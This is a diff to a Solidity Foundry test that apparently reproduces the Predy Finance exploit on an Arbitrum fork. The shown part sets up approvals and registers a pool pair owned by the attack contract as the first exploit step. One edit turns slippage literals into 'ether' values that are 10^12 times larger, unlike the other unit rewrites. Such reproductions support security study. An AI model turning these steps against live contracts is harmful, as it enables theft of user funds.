@@ -13,10 +13,6 @@ import "../interface.sol";
 // @Info
 // Vulnerable Contract Code : https://arbiscan.io/address/https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c#code
 
-// @Analysis
-// Post-mortem :
-// Twitter Guy :
-// Hacking God :
 pragma solidity ^0.8.0;
 
 contract PredyFinance is BaseTestWithBalanceLog {
@@ -27,18 +23,16 @@ contract PredyFinance is BaseTestWithBalanceLog {
 
     function setUp() public {
         vm.createSelectFork("arbitrum", blocknumToForkFrom);
-        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
         fundingToken = address(USDC);
         vm.label(address(WETH), "WETH");
         vm.label(address(USDC), "USDC");
         vm.label(address(predyPool), "PredyPool");
+
+        USDC.approve(address(predyPool), type(uint256).max);
+        WETH.approve(address(predyPool), type(uint256).max);
     }
 
     function testExploit() public balanceLog {
-        USDC.approve(address(predyPool), type(uint256).max);
-        WETH.approve(address(predyPool), type(uint256).max);
-
-        //implement exploit code here
         AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
             marginId: address(WETH),
             poolOwner: address(this),
@@ -47,24 +41,24 @@ contract PredyFinance is BaseTestWithBalanceLog {
             whitelistEnabled: false,
             fee: 0,
             assetRiskParams: Perp.AssetRiskParams({
-                riskRatio: 100_000_001,
+                riskRatio: 0.100000001 gwei,
                 debtRiskRatio: 0,
                 rangeSize: 1000,
                 rebalanceThreshold: 500,
-                minSlippage: 1_005_000,
-                maxSlippage: 1_050_000
+                minSlippage: 1.005 ether,
+                maxSlippage: 1.05 ether
             }),
             quoteIrmParams: InterestRateModel.IRMParams({
-                baseRate: 10_000_000_000_000_000,
-                kinkRate: 900_000_000_000_000_000,
-                slope1: 500_000_000_000_000_000,
-                slope2: 1_000_000_000_000_000_000
+                baseRate: 0.01 ether,
+                kinkRate: 0.9 ether,
+                slope1: 0.5 ether,
+                slope2: 1 ether
             }),
             baseIrmParams: InterestRateModel.IRMParams({
-                baseRate: 10_000_000_000_000_000,
-                kinkRate: 900_000_000_000_000_000,
-                slope1: 500_000_000_000_000_000,
-                slope2: 1_000_000_000_000_000_000
+                baseRate: 0.01 ether,
+                kinkRate: 0.9 ether,
+                slope1: 0.5 ether,
+                slope2: 1 ether
             })
         });
         uint256 pairId = predyPool.registerPair(addPairParam); // register pair, the owner of the pair is attack contract
